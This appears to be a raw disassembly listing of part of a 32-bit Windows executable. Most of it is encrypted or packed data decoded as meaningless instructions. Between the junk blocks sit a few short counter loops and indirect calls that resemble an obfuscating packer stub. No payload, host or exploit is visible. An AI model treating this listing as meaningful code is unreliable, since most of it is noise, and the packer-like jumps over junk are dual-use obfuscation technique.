  4067d0:	push   0xffffff8e
  4067d2:	fs jno 0x406832
  4067d5:	ret    0xacd1
  4067d8:	lahf   
  4067d9:	enter  0x638c,0x47
  4067dd:	(bad)  
  4067de:	adc    eax,0xf62ae0f9
  4067e3:	stos   BYTE PTR es:[edi],al
  4067e4:	retf   0x2315
  4067e7:	push   ss
  4067e8:	xchg   ebp,eax
  4067e9:	jg     0x406824
  4067eb:	jge    0x4067de
  4067ed:	inc    eax
  4067ee:	jle    0x406795
  4067f0:	js     0x40681c
  4067f2:	mov    ah,0xd2
  4067f4:	dec    edx
  4067f5:	xor    cl,ah
  4067f7:	test   eax,0xc9d96f90
  4067fc:	das    
  4067fd:	mov    dx,0x3592
  406801:	push   es
  406802:	jg     0x4067a2
  406804:	dec    ebx
  406805:	or     eax,0x4d7654f
  40680a:	xchg   esi,eax
  40680b:	ins    BYTE PTR es:[edi],dx
  40680c:	bound  edi,QWORD PTR [ebp+edi*2+0x56c43d22]
  406813:	test   DWORD PTR [eax-0x40bac491],0x953ee2d7
  40681d:	adc    al,0x8a
  40681f:	cdq    
  406820:	dec    edi
  406821:	adc    al,cl
  406823:	mov    ebx,0xe75cddce
  406828:	jo     0x40687a
  40682a:	xchg   esp,eax
  40682b:	out    0xd7,eax
  40682d:	push   0x52d56724
  406832:	lahf   
  406833:	ins    BYTE PTR es:[edi],dx
  406834:	rol    BYTE PTR [ecx+edx*2-0x52e9e02],cl
  40683b:	sbb    DWORD PTR [eax+0x77],edx
  40683e:	fcomp  QWORD PTR [ebx-0x58]
  406841:	mov    ds:0x2640c4f7,eax
  406846:	push   edx
  406847:	clc    
  406848:	mov    BYTE PTR [ecx-0x1a],cl
  40684b:	sbb    DWORD PTR [ecx],ebx
  40684d:	inc    eax
  40684e:	ja     0x4067f0
  406850:	scas   al,BYTE PTR es:[edi]
  406851:	neg    DWORD PTR [ecx]
  406853:	mov    ebp,0x604e3934
  406858:	cdq    
  406859:	inc    edi
  40685a:	out    0x2b,al
  40685c:	push   ss
  40685d:	rcl    DWORD PTR [edx+0x41],0x43
  406861:	push   ds
  406862:	cmc    
  406863:	sbb    BYTE PTR [ebp+0x32a06836],bl
  406869:	cmp    BYTE PTR [esi],ah
  40686b:	fisub  WORD PTR [esi-0x52]
  40686e:	mov    ebp,0xc82ad1aa
  406873:	sbb    DWORD PTR [ecx+ebx*1+0x30],edi
  406877:	(bad)  
  406878:	shl    DWORD PTR [eax+0x3ac55b81],1
  40687e:	mov    eax,0xe9093fa9
  406883:	adc    cl,BYTE PTR [eax+edx*2-0x15]
  406887:	repz dec ecx
  406889:	sub    bl,bl
  40688b:	jae    0x406855
  40688d:	popa   
  40688e:	lds    edx,FWORD PTR [ebx]
  406890:	imul   esi,DWORD PTR [eax],0x77
  406893:	jmp    0xa1a0:0x6dec3780
  40689a:	clc    
  40689b:	rol    edi,1
  40689d:	push   es
  40689e:	xchg   ebx,eax
  40689f:	jge    0x40685e
  4068a1:	or     esp,DWORD PTR [ebp+ebp*1-0x5a]
  4068a5:	pop    esp
  4068a6:	aaa    
  4068a7:	imul   eax,ebx,0xffffffb8
  4068aa:	push   ebx
  4068ab:	imul   eax,edx,0x120476e1
  4068b1:	arpl   WORD PTR [eax+esi*1+0x458c57ab],ax
  4068b8:	dec    ebp
  4068b9:	add    al,0xb
  4068bb:	nop
  4068bc:	sbb    edx,edi
  4068be:	ret    0x544f
  4068c1:	push   0xffffffd6
  4068c3:	ret    0xf5c
  4068c6:	push   ss
  4068c7:	pop    esi
  4068c8:	adc    eax,0xaca0abb1
  4068cd:	jmp    0x1b08:0x8cc13c82
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	xor    al,0x8f
  40695d:	sub    ebx,DWORD PTR [eax+eax*1+0x647878c9]
  406964:	jle    0x4069de
  406966:	js     0x406926
  406968:	addr16 mov dh,0x12
  40696b:	inc    ebx
  40696c:	mov    eax,ds:0xe27d2458
  406971:	sbb    ebp,DWORD PTR [esi+esi*8-0x42]
  406975:	cwde   
  406976:	or     BYTE PTR [esi],dh
  406978:	dec    esp
  406979:	jg     0x4069a1
  40697b:	in     al,0x5d
  40697d:	jmp    0x4069c5
  40697f:	adc    al,0xde
  406981:	lds    edi,FWORD PTR [edi+ebp*4-0x7f]
  406985:	adc    ah,BYTE PTR [ebx]
  406987:	fisttp QWORD PTR [ebx]
  406989:	push   ds
  40698a:	and    DWORD PTR [ebx],0xc61c447d
  406990:	scas   al,BYTE PTR es:[edi]
  406991:	adc    BYTE PTR [ebp+ebp*2+0x360179dd],0xab
  406999:	gs push cs
  40699b:	cld    
  40699c:	popa   
  40699d:	sub    eax,0x2fdbda70
  4069a2:	sub    DWORD PTR [edi+eax*4-0x3b],esp
  4069a6:	mov    edi,0xc337b6d6
  4069ab:	dec    eax
  4069ac:	mov    ds:0x3afa27f4,eax
  4069b1:	popa   
  4069b2:	cmp    DWORD PTR [eax+0x1029bad],ebp
  4069b8:	in     al,dx
  4069b9:	out    dx,al
  4069ba:	sub    DWORD PTR ss:[ebx],edi
  4069bd:	pop    esi
  4069be:	pop    ds
  4069bf:	aaa    
  4069c0:	inc    esp
  4069c1:	mov    WORD PTR [edi-0x43],fs
  4069c4:	sbb    eax,0xdd4542d3
  4069c9:	mov    ecx,DWORD PTR [ecx+0x53]
  4069cc:	mov    ch,BYTE PTR [ecx-0x25b17c8d]
  4069d2:	add    DWORD PTR [ebx],0x3edb6a93
  4069d8:	imul   esi,DWORD PTR ds:0x51811344,0xffffffc7
  4069df:	and    eax,0x97e8d9e6
  4069e4:	push   esi
  4069e5:	into   
  4069e6:	out    0x88,eax
  4069e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e9:	scas   eax,DWORD PTR es:[edi]
  4069ea:	clc    
  4069eb:	jno    0x406a45
  4069ed:	jge    0x40699a
  4069ef:	cli    
  4069f0:	xchg   edx,eax
  4069f1:	adc    DWORD PTR [ecx-0x52f80f99],esi
  4069f7:	and    dl,cl
  4069f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fa:	cmp    esi,DWORD PTR [edx+edi*2]
  4069fd:	(bad)  
  4069fe:	cmp    DWORD PTR [ebx],edi
  406a00:	shr    BYTE PTR [edx+0x1c],cl
  406a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a04:	mov    al,ds:0xca160aff
  406a09:	hlt    
  406a0a:	mov    eax,ds:0xfbddcf7d
  406a0f:	cmc    
  406a10:	je     0x406a53
  406a12:	dec    esi
  406a13:	dec    edi
  406a14:	mov    ds:0x8f1adb38,eax
  406a19:	loop   0x406a46
  406a1b:	in     al,dx
  406a1c:	inc    edx
  406a1d:	call   0xebc7:0x395ff19f
  406a24:	mov    dl,0xef
  406a26:	ins    DWORD PTR es:[edi],dx
  406a27:	xor    al,0x18
  406a29:	xor    DWORD PTR [eax],ecx
  406a2b:	lods   eax,DWORD PTR ds:[esi]
  406a2c:	out    0x15,eax
  406a2e:	test   DWORD PTR [esp+edi*8+0x9],ecx
  406a32:	int    0xe0
  406a34:	xor    eax,0xa706712e
  406a39:	or     eax,0x367ffd1f
  406a3e:	mov    ds:0xf7e4aaa6,eax
  406a43:	cmp    ah,BYTE PTR [eax-0x66de2e06]
  406a49:	sti    
  406a4a:	xchg   esi,eax
  406a4b:	inc    edx
  406a4c:	rcr    DWORD PTR [edi-0x650fffd5],0xac
  406a53:	cmp    al,0x5d
  406a55:	fldenv [ecx-0x65]
  406a58:	jl     0x406aa3
  406a5a:	in     eax,0x77
  406a5c:	call   0xc15b:0xb29fef3b
  406a63:	inc    edi
  406a64:	cdq    
  406a65:	icebp  
  406a66:	pop    ss
  406a67:	add    ah,cl
  406a69:	clc    
  406a6a:	ret    
  406a6b:	loop   0x406ad3
  406a6d:	fsubr  QWORD PTR [edx-0x15f1862e]
  406a73:	cmp    BYTE PTR [edi+0x36763103],dl
  406a79:	fld    QWORD PTR [eax-0x6656a9a4]
  406a7f:	xlat   BYTE PTR ds:[ebx]
  406a80:	xor    eax,0x34dab16e
  406a85:	fcmove st,st(5)
  406a87:	retf   
  406a88:	icebp  
  406a89:	xor    al,BYTE PTR ds:0xc23950a2
  406a8f:	and    esp,DWORD PTR [esp+ebp*8+0x70]
  406a93:	out    dx,eax
  406a94:	sbb    al,0xf5
  406a96:	icebp  
  406a97:	cwde   
  406a98:	xor    al,0x7b
  406a9a:	jp     0x406a1d
  406a9c:	mov    dl,0x89
  406a9e:	clc    
  406a9f:	push   ss
  406aa0:	mov    al,ds:0xffaf08d3
  406aa5:	xchg   edi,eax
  406aa6:	add    BYTE PTR [eax+0x431df7dd],0x2f
  406aad:	mov    gs,esp
  406aaf:	loope  0x406a8f
  406ab1:	dec    edx
  406ab2:	cmp    ah,BYTE PTR [ebp-0x74]
  406ab5:	es sbb al,0x1
  406ab8:	push   ebx
  406ab9:	adc    BYTE PTR [eax],dh
  406abb:	call   0xe48:0x3eadf401
  406ac2:	push   edx
  406ac3:	inc    ebp
  406ac4:	adc    ecx,DWORD PTR [edi-0x33]
  406ac7:	and    esi,DWORD PTR [eax+edx*8+0x65]
  406acb:	mov    edi,0x4855f60d
  406ad0:	xlat   BYTE PTR ds:[ebx]
  406ad1:	fnstsw WORD PTR [ecx-0x77]
  406ad4:	pop    es
  406ad5:	jmp    0x785:0xd554def4
  406adc:	cdq    
  406add:	add    esi,DWORD PTR [ebx]
  406adf:	outs   dx,DWORD PTR ds:[esi]
  406ae0:	(bad)  [eax-0x24]
  406ae3:	sbb    bl,ah
  406ae5:	clc    
  406ae6:	xchg   edi,eax
  406ae7:	test   BYTE PTR [edx+0x30],0xe
  406aeb:	or     BYTE PTR [eax-0x1522d496],bh
  406af1:	pop    ss
  406af2:	add    ebp,DWORD PTR [ebp-0x79]
  406af5:	xchg   ebx,eax
  406af6:	or     eax,0xc9533798
  406afb:	sub    eax,0xd46d8a50
  406b00:	into   
  406b01:	and    DWORD PTR [edx+0x63],edx
  406b04:	mov    ds:0xede9ad60,eax
  406b09:	or     DWORD PTR [esi-0x328068fa],edi
  406b0f:	inc    ebx
  406b10:	imul   esp,edx,0x10
  406b13:	jmp    FWORD PTR [eax+0x60]
  406b16:	int    0xe1
  406b18:	cmp    eax,0xbdc42b81
  406b1d:	xchg   ecx,eax
  406b1e:	push   ds
  406b1f:	div    BYTE PTR [esi-0x25]
  406b22:	in     eax,0x37
  406b24:	lds    esi,FWORD PTR [edx+0x201e1a31]
  406b2a:	in     eax,0xc6
  406b2c:	test   DWORD PTR [edx],eax
  406b2e:	aas    
  406b2f:	sahf   
  406b30:	aas    
  406b31:	fldcw  WORD PTR [eax-0x333c14c4]
  406b37:	pop    esi
  406b38:	dec    esp
  406b39:	outs   dx,BYTE PTR ds:[esi]
  406b3a:	inc    edi
  406b3b:	pop    ebx
  406b3c:	shl    BYTE PTR [ecx+0x2c],0x16
  406b40:	dec    esp
  406b41:	and    DWORD PTR [ecx+eiz*2],ebx
  406b44:	cdq    
  406b45:	sub    BYTE PTR [edi+eax*1],bh
  406b48:	add    eax,0xe5ae8db4
  406b4d:	ret    
  406b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b4f:	fldenv [ebx+0x1c09a925]
  406b55:	scas   al,BYTE PTR es:[edi]
  406b56:	cmc    
  406b57:	pop    eax
  406b58:	pop    ebx
  406b59:	push   ecx
  406b5a:	jns    0x406b12
  406b5c:	mov    gs,WORD PTR [ebp-0x2d]
  406b5f:	rcr    BYTE PTR [edx-0x73],cl
  406b62:	jp     0x406b45
  406b64:	sbb    ch,BYTE PTR [edi]
  406b66:	inc    ebx
  406b67:	xchg   BYTE PTR [edi-0x61],al
  406b6a:	iret   
  406b6b:	sbb    DWORD PTR [ebp*8-0x48ba4343],edx
  406b72:	sbb    al,0x26
  406b74:	jne    0x406be9
  406b76:	aam    0x25
  406b78:	das    
  406b79:	jb     0x406ba5
  406b7b:	or     ebx,edx
  406b7d:	and    al,ah
  406b7f:	rol    DWORD PTR [edx],cl
  406b81:	clc    
  406b82:	mov    DWORD PTR [ebp-0x5f],0xa08a3d9b
  406b89:	sbb    bl,BYTE PTR [edx-0x2fba6436]
  406b8f:	dec    eax
  406b90:	mov    WORD PTR [ebx-0x6bc728af],?
  406b96:	cli    
  406b97:	and    eax,DWORD PTR [eax+0x7c41e3fb]
  406b9d:	mov    ds:0xd1b26ec0,eax
  406ba2:	psllw  mm5,QWORD PTR [edi]
  406ba5:	push   ds
  406ba6:	xchg   esi,eax
  406ba7:	sbb    ebx,DWORD PTR [edi+ecx*1]
  406baa:	mov    ss,WORD PTR [edx-0x65d643b4]
  406bb0:	pop    es
  406bb1:	loop   0x406bb8
  406bb3:	cmp    DWORD PTR [edi-0x1050ffce],ebp
  406bb9:	int    0xa2
  406bbb:	jb     0x406c00
  406bbd:	rcl    edi,1
  406bbf:	adc    DWORD PTR [ebx+0x44f9786f],ebx
  406bc5:	fmul   QWORD PTR [edx+eax*2-0x14]
  406bc9:	cmp    DWORD PTR [esi],edi
  406bcb:	in     al,dx
  406bcc:	and    ch,BYTE PTR [edx]
  406bce:	fnstcw WORD PTR [ebx]
  406bd0:	xor    al,0xfa
  406bd2:	rcl    DWORD PTR [ecx+0x10c9aa67],0x96
  406bd9:	adc    al,0x9
  406bdb:	push   cs
  406bdc:	sub    al,0x78
  406bde:	inc    ebp
  406bdf:	fiadd  DWORD PTR ds:0x73de8746
  406be5:	pop    esp
  406be6:	fstp   TBYTE PTR [ecx-0x5cb3314c]
  406bec:	dec    edi
  406bed:	in     eax,dx
  406bee:	(bad)  
  406bef:	cli    
  406bf0:	out    0x9d,al
  406bf2:	add    ah,dl
  406bf4:	cmc    
  406bf5:	and    esi,DWORD PTR [ebp+0xd]
  406bf8:	cmp    al,0xf1
  406bfa:	in     al,0xf5
  406bfc:	stc    
  406bfd:	addr16 jne 0x406b87
  406c00:	mov    ah,0xe0
  406c02:	fwait
  406c03:	cdq    
  406c04:	mov    dl,0xa3
  406c06:	nop
  406c07:	outs   dx,BYTE PTR ds:[esi]
  406c08:	sbb    al,0xc4
  406c0a:	push   0xfffffffa
  406c0c:	jns    0x406c38
  406c0e:	test   eax,0x2c2ca79
  406c13:	inc    ebp
  406c14:	nop
  406c15:	ror    BYTE PTR [esi],1
  406c17:	hlt    
  406c18:	neg    DWORD PTR [esi-0x392b6fde]
  406c1e:	cmp    dh,BYTE PTR [edx-0x13]
  406c21:	inc    ecx
  406c22:	jo     0x406bbc
  406c24:	rol    dh,0xc9
  406c27:	xchg   edi,eax
  406c28:	mov    ecx,0x6edcb1a1
  406c2d:	addr16 das 
  406c2f:	xchg   ebx,eax
  406c30:	push   0x195f216b
  406c35:	aas    
  406c36:	jge    0x406bf9
  406c38:	mov    ebp,0xadf7ff80
  406c3d:	push   es
  406c3e:	inc    cx
  406c40:	int    0x97
  406c42:	fldenv [ebx]
  406c44:	nop
  406c45:	add    edi,ebx
  406c47:	dec    ebx
  406c48:	pusha  
  406c49:	push   ds
  406c4a:	or     DWORD PTR [edi],ebp
  406c4c:	push   ebp
  406c4d:	test   BYTE PTR [ebp+0x3ef3ce72],dh
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x39],ebx
  406c91:	daa    
  406c92:	out    0xce,al
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cc3
  406c9d:	scas   al,BYTE PTR es:[edi]
  406c9e:	jb     0x406cc4
  406ca0:	jo     0x406cfe
  406ca2:	and    eax,0xe68f9f7d
  406ca7:	inc    DWORD PTR [ebp-0x5ea5554b]
  406cad:	shr    BYTE PTR [ecx],cl
  406caf:	dec    ebp
  406cb0:	pop    edi
  406cb1:	mov    esp,0xc8f1f45b
  406cb6:	in     al,0xda
  406cb8:	out    dx,eax
  406cb9:	mov    ebp,0x7e29ea35
  406cbe:	jbe    0x406d21
  406cc0:	stc    
  406cc1:	mov    ecx,0x79ad180b
  406cc6:	aaa    
  406cc7:	xchg   esp,eax
  406cc8:	push   ss
  406cc9:	pop    esp
  406cca:	cmp    cl,BYTE PTR [ebx]
  406ccc:	xchg   BYTE PTR [edx-0x649498b9],ch
  406cd2:	cdq    
  406cd3:	mov    DWORD PTR [esi+ecx*1+0x5],ecx
  406cd7:	xlat   BYTE PTR ds:[ebx]
  406cd8:	push   ss
  406cd9:	mov    ebp,0x6fcf0c0
  406cde:	dec    edx
  406cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce0:	push   eax
  406ce1:	adc    BYTE PTR [ebx+0x66],dh
  406ce4:	add    DWORD PTR [esi+0x6e8a6103],esp
  406cea:	enter  0xaa6,0x88
  406cee:	xchg   ecx,eax
  406cef:	das    
  406cf0:	cld    
  406cf1:	(bad)  [edi+edi*8]
  406cf4:	sbb    al,0xf2
  406cf6:	jl     0x406cf7
  406cf8:	adc    ecx,DWORD PTR [esi]
  406cfa:	into   
  406cfb:	ja     0x406cb1
  406cfd:	lods   al,BYTE PTR ds:[esi]
  406cfe:	aad    0xc7
  406d00:	loope  0x406d2c
  406d02:	mov    esp,0x72287f33
  406d07:	fndisi(8087 only) 
  406d09:	ss mov bl,0x7b
  406d0c:	sub    dl,dl
  406d0e:	imul   eax,edx,0xffffff8b
  406d11:	retf   
  406d12:	xor    al,0x8c
  406d14:	xchg   esp,eax
  406d15:	xchg   esi,eax
  406d16:	push   eax
  406d17:	mov    ch,0xd9
  406d19:	inc    edi
  406d1a:	sbb    dl,al
  406d1c:	test   cl,bh
  406d1e:	fiadd  WORD PTR [edx-0x46]
  406d21:	sti    
  406d22:	dec    esi
  406d23:	stos   DWORD PTR es:[edi],eax
  406d24:	adc    al,0xba
  406d26:	push   eax
  406d27:	je     0x406caa
  406d29:	and    BYTE PTR [ebp-0x6a6edbee],ah
  406d2f:	loopne 0x406d94
  406d31:	lods   al,BYTE PTR ds:[esi]
  406d32:	push   esp
  406d33:	dec    ecx
  406d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d35:	dec    ebx
  406d36:	aam    0xfb
  406d38:	and    DWORD PTR ds:0x45c116a1,ecx
  406d3e:	xor    al,0x54
  406d40:	ins    BYTE PTR es:[edi],dx
  406d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d42:	int3   
  406d43:	dec    ecx
  406d44:	bound  esp,QWORD PTR [ecx]
  406d46:	cmp    eax,0x1d6bc272
  406d4b:	test   al,ch
  406d4d:	mov    ds:0xfcb66a81,eax
  406d52:	pop    eax
  406d53:	or     al,0x92
  406d55:	je     0x406cfd
  406d57:	push   0x1
  406d59:	xchg   esp,eax
  406d5a:	(bad)
  406d5e:	mov    ds:0x76463f01,eax
  406d63:	in     eax,dx
  406d64:	shl    ecx,0x8c
  406d67:	and    BYTE PTR [ecx+eiz*1],bl
  406d6a:	cli    
  406d6b:	cmp    ebp,DWORD PTR [ecx]
  406d6d:	and    ah,BYTE PTR [edx+0x79161bee]
  406d73:	stc    
  406d74:	pop    esi
  406d75:	xor    eax,0x2271eef2
  406d7a:	test   DWORD PTR [eax+0x52],ebp
  406d7d:	inc    esp
  406d7e:	sahf   
  406d7f:	push   ss
  406d80:	sahf   
  406d81:	lock sub BYTE PTR [ecx-0x30],bh
  406d85:	data16 cmp al,0x24
  406d88:	jmp    0x406d74
  406d8a:	mov    dl,0xda
  406d8c:	or     eax,0xff250afe
  406d91:	xchg   esp,eax
  406d92:	adc    BYTE PTR [ebp+0x52444c28],al
  406d98:	mov    eax,0xa9ff844d
  406d9d:	fcom   QWORD PTR [esi]
  406d9f:	jecxz  0x406d63
  406da1:	aaa    
  406da2:	sbb    al,0xdf
  406da4:	ret    
  406da5:	sub    al,0xf
  406da7:	in     al,0x37
  406da9:	cmc    
  406daa:	mov    bl,0xdb
  406dac:	je     0x406d7b
  406dae:	cli    
  406daf:	ror    BYTE PTR [eax-0x1512bb77],0xfc
  406db6:	inc    ecx
  406db7:	mov    DWORD PTR [ebx],ebx
  406db9:	mov    BYTE PTR [esi*4+0xc856319],bl
  406dc0:	mul    DWORD PTR [ebx+0xfac670a]
  406dc6:	fs mov ah,0xf8
  406dc9:	cwde   
  406dca:	xchg   edi,eax
  406dcb:	adc    dh,BYTE PTR [esi-0x3b]
  406dce:	mov    edi,0xc9d98881
  406dd3:	icebp  
  406dd4:	mov    eax,0xa2378c61
  406dd9:	ja     0x406d63
  406ddb:	and    ah,BYTE PTR [esi-0x17f18d23]
  406de1:	stc    
  406de2:	retf   
  406de3:	add    al,0x95
  406de5:	scas   eax,DWORD PTR es:[edi]
  406de6:	jp     0x406dd2
  406de8:	adc    DWORD PTR [edi],esi
  406dea:	das    
  406deb:	popf   
  406dec:	pop    ebx
  406ded:	or     al,0x16
  406def:	mov    ds:0x73acdb92,eax
  406df4:	adc    ah,BYTE PTR [ebp-0x6e56019b]
  406dfa:	dec    eax
  406dfb:	dec    edi
  406dfc:	pop    ecx
  406dfd:	pop    ss
  406dfe:	aas    
  406dff:	mov    edi,esi
  406e01:	es xchg edx,eax
  406e03:	lock imul edx,DWORD PTR [ecx+0x34e2e5d2],0x882e111c
  406e0e:	out    dx,eax
  406e0f:	lods   al,BYTE PTR ds:[esi]
  406e10:	xchg   ebp,eax
  406e11:	push   esp
  406e12:	inc    esp
  406e13:	cmp    eax,0x4bfb3b16
  406e18:	addr16 (bad) 
  406e1a:	retf   0x3e9d
  406e1d:	stos   BYTE PTR es:[edi],al
  406e1e:	mov    al,BYTE PTR [edi+esi*4-0x92a4280]
  406e25:	inc    BYTE PTR [ecx+0x33]
  406e28:	jae    0x406e89
  406e2a:	push   ebp
  406e2b:	retf   
  406e2c:	les    esi,FWORD PTR [ebx+0x6b]
  406e2f:	jno    0x406e71
  406e31:	retf   0xc325
  406e34:	dec    edi
  406e35:	ffreep st(4)
  406e38:	cwde   
  406e39:	add    BYTE PTR [edx],al
  406e3b:	xor    al,0xa2
  406e3d:	pop    esi
  406e3e:	inc    ecx
  406e3f:	and    eax,0x628b989c
  406e44:	in     al,dx
  406e45:	pop    esp
  406e46:	jl     0x406e14
  406e48:	cwde   
  406e49:	mov    al,ds:0x49c8cd45
  406e4e:	jge    0x406ec7
  406e50:	xchg   edx,eax
  406e51:	fsub   st(5),st
  406e53:	fsub   DWORD PTR [ebx+0x53]
  406e56:	mov    esi,0xa5f45263
  406e5b:	push   eax
  406e5c:	xchg   ebx,eax
  406e5d:	int    0x2
  406e5f:	ss mov esi,0x853ccd9f
  406e65:	push   edi
  406e66:	mov    ebx,0xc6f1d647
  406e6b:	lock xchg DWORD PTR [ebp+0x5952c358],edx
  406e72:	or     DWORD PTR [ebx+0x67300283],esi
  406e78:	or     eax,0xa0fb45c4
  406e7d:	xlat   BYTE PTR ds:[ebx]
  406e7e:	pop    es
  406e7f:	xchg   ecx,eax
  406e80:	sub    BYTE PTR [edx],ch
  406e82:	aaa    
  406e83:	outs   dx,BYTE PTR ds:[esi]
  406e84:	sub    BYTE PTR [edx],bh
  406e86:	jmp    FWORD PTR [ebx+0x64]
  406e89:	or     BYTE PTR [ebp-0x6f2f1b4d],ch
  406e8f:	xchg   bh,al
  406e91:	add    eax,0xbc0905f0
  406e96:	add    ecx,esp
  406e98:	jae    0x406ef1
  406e9a:	cmp    eax,0x1ba3832a
  406e9f:	push   eax
  406ea0:	fwait
  406ea1:	fwait
  406ea2:	lods   al,BYTE PTR ds:[esi]
  406ea3:	push   edx
  406ea4:	nop
  406ea5:	je     0x406e64
  406ea7:	jge    0x406e48
  406ea9:	xchg   ecx,eax
  406eaa:	jae    0x406e4b
  406eac:	and    eax,0xd2100175
  406eb1:	das    
  406eb2:	lea    esi,[ecx]
  406eb4:	out    0x25,eax
  406eb6:	loop   0x406ef4
  406eb8:	out    0x99,al
  406eba:	dec    ecx
  406ebb:	out    dx,al
  406ebc:	loope  0x406e7b
  406ebe:	jb     0x406e68
  406ec0:	clc    
  406ec1:	mov    ah,0xb8
  406ec3:	into   
  406ec4:	rcl    cl,0x54
  406ec7:	retf   0xde0b
  406eca:	je     0x406f20
  406ecc:	mov    edx,DWORD PTR [ebx-0x6]
  406ecf:	jp     0x406edc
  406ed1:	and    cl,dh
  406ed3:	jge    0x406ef3
  406ed5:	mov    dh,0xeb
  406ed7:	cs inc ebp
  406ed9:	dec    esp
  406eda:	sbb    DWORD PTR ds:0x85bb5fb5,esp
  406ee0:	out    0x65,al
  406ee2:	not    bh
  406ee4:	or     DWORD PTR [edx+0x19],ebx
  406ee7:	mov    dh,0x9f
  406ee9:	je     0x406f5a
  406eeb:	icebp  
  406eec:	out    0x9,al
  406eee:	out    0x75,eax
  406ef0:	imul   edx,DWORD PTR [edi-0x1d937a9],0xffffffb2
  406ef7:	ins    DWORD PTR es:[edi],dx
  406ef8:	aas    
  406ef9:	and    al,BYTE PTR [edx-0x32a05b9c]
  406eff:	inc    ebp
  406f00:	pop    ds
  406f01:	js     0x406e95
  406f03:	mov    dl,0x85
  406f05:	push   ecx
  406f06:	test   al,0xe5
  406f08:	dec    edi
  406f09:	mov    bl,0xb7
  406f0b:	sub    al,0x17
  406f0d:	jo     0x406f3a
  406f0f:	xlat   BYTE PTR es:[ebx]
  406f11:	or     ecx,DWORD PTR [esi+0x42]
  406f14:	aad    0x49
  406f16:	xchg   esi,eax
  406f17:	mov    bl,0x17
  406f19:	pop    edx
  406f1a:	inc    eax
  406f1b:	test   DWORD PTR [edi],ecx
  406f1d:	hlt    
  406f1e:	pop    esi
  406f1f:	adc    BYTE PTR [eax],bh
  406f21:	xor    eax,0x1c244b00
  406f26:	arpl   di,di
  406f28:	stc    
  406f29:	fsub   DWORD PTR [ecx-0x76277db8]
  406f2f:	rcl    DWORD PTR gs:[edi],0x96
  406f33:	out    dx,eax
  406f34:	or     eax,0x99b1ad3d
  406f39:	xchg   ecx,eax
  406f3a:	out    dx,al
  406f3b:	lods   eax,DWORD PTR ds:[esi]
  406f3c:	cli    
  406f3d:	rdmsr  
  406f3f:	ret    0x3f31
  406f42:	ss pop eax
  406f44:	mov    ah,0xd
  406f46:	jecxz  0x406ef1
  406f48:	push   ss
  406f49:	int3   
  406f4a:	scas   al,BYTE PTR es:[edi]
  406f4b:	addr16 js 0x406f1d
  406f4e:	cwde   
  406f4f:	mov    eax,0x267b5273
  406f54:	sahf   
  406f55:	sar    DWORD PTR [ebx],0x59
  406f58:	add    eax,0x6388fd43
  406f5d:	lods   al,BYTE PTR ds:[esi]
  406f5e:	mov    DWORD PTR [edi-0x61775593],edi
  406f64:	mov    eax,0xcb4fa456
  406f69:	jo     0x406f67
  406f6b:	inc    ebp
  406f6c:	rcl    DWORD PTR [edx+0x4f4b39bf],0xc3
  406f73:	mov    ebp,0x552af978
  406f78:	or     al,0xd0
  406f7b:	dec    edi
  406f7c:	inc    eax
  406f7d:	xchg   esp,eax
  406f7e:	out    0xc1,al
  406f80:	push   edi
  406f81:	or     eax,0xd0c42454
  406f86:	outs   dx,BYTE PTR ds:[esi]
  406f87:	xchg   ebp,eax
  406f88:	add    ax,cx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
